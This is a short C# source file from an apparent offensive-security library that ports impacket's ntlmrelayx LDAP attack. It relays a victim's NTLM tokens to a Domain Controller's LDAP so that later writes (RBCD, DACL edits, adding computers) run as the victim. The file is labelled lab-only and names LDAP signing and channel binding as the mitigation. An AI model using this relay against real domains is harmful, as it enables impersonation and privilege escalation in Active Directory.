using DotNetPacket.Protocols.Ntlm;

namespace DotNetPacket.Protocols.Ldap;

/// <summary>
/// Relays an NTLM authentication to a Domain Controller's LDAP (ntlmrelayx ldapattack): drives an
/// <see cref="LdapConnection"/>'s GSS-SPNEGO SASL bind with the victim's tokens. After a successful
/// relayed bind the LDAP connection is authenticated as the victim, so the existing LDAP write
/// primitives (rbcd / dacledit / addcomputer) can run over it as that identity. Port of the bind side
/// of impacket's <c>ntlmrelayx/attacks/ldapattack.py</c> + its LDAP relay client.
///
/// LAB-ONLY. The relayed bind is unsigned (the relay has no session key); a DC that enforces LDAP
/// signing or channel binding rejects it — which is the intended mitigation and a faithful outcome to
/// capture.
/// </summary>
public sealed class LdapRelayClientTarget : IRelayTarget, IDisposable
{
    private readonly LdapConnection _ldap;

    public LdapRelayClientTarget(string dcHost, int port = 389) => _ldap = LdapConnection.Connect(dcHost, port);

    /// <summary>The bound LDAP connection — usable as the relayed victim once <see cref="Authenticate"/> returns 0.</summary>
    public LdapConnection Ldap => _ldap;

    public byte[] Negotiate(byte[] victimType1) => _ldap.RelayBindChallenge(victimType1);

    public uint Authenticate(byte[] victimType3, byte[]? mechListMic) =>
        (uint)_ldap.RelayBindAuthenticate(victimType3, mechListMic); // 0 = success, matching the relay outcome convention

    public void Dispose() => _ldap.Dispose();
}
